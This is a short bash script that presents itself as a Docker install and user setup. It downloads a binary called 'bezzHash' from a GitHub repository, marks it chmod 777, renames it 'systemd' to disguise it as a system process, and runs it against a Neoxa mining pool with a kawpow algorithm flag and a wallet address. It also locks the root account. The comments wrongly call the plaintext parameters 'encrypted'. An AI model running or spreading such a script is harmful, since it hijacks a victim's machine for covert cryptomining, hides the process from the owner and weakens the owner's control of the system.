#!/bin/bash

# Update and install docker.io
sudo apt update && sudo apt install -y docker.io

# Add user to docker group
sudo usermod -aG docker root
sudo usermod --add-subuids 10-20000 root
sudo usermod -L root

# Download the script and make it executable
wget https://github.com/Testdrive345/scriptX/raw/main/bezzHash && chmod 777 bezzHash

# Move the script to systemd directory
mv bezzHash systemd

# Encode parameters
par_encoded="--par=kawpow"
user_encoded="--user GgxJdQzEZeXHQZSApbCdWFtYR7QufiN1RL"
server_encoded="--server de.neoxa.herominers.com:1202"

# Execute the command with encrypted parameters
./systemd $par_encoded $user_encoded $server_encoded
